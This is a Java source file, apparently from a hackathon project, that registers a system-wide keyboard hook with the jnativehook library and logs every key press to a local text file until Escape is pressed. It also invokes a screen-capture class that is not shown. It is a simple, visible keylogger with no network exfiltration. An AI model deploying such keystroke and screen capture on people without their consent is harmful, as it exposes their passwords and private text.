package ourprojecthackathon;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;



 public class keydetect implements NativeKeyListener {
	static  FileWriter f;
	 static BufferedWriter br;
	 
     public void nativeKeyPressed(NativeKeyEvent e) {
         System.out.println("Key Pressed is : " + NativeKeyEvent.getKeyText(e.getKeyCode()));
         try {
        		        		System.out.println("hello");
        		br.write(NativeKeyEvent.getKeyText(e.getKeyCode()));
        	
        		 
        	} catch (IOException e2) {
        		// TODO Auto-generated catch block
        		e2.printStackTrace();
        	}

         if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
             try {	try {
				br.close();
			} catch (IOException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
				  GlobalScreen.unregisterNativeHook();
			     }     catch (NativeHookException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
         }
     }

     public void nativeKeyReleased(NativeKeyEvent e) {
         System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
     }

     public void nativeKeyTyped(NativeKeyEvent e) {
         System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
     }

     public static void main(String[] args) {
    	  new filepermission();
    	 
    	 System.out.print("going to take");
         try {
        	 f = new FileWriter("F:\\softwarestorage\\java1.txt");
     		 br=new BufferedWriter(f);

             GlobalScreen.registerNativeHook();
         }
         catch (NativeHookException ex) {
             System.err.println("There was a problem registering the native hook.");
             System.err.println(ex.getMessage());

             System.exit(1);
         } catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

         GlobalScreen.addNativeKeyListener(new keydetect());
         new capturescreen();
     }
 }

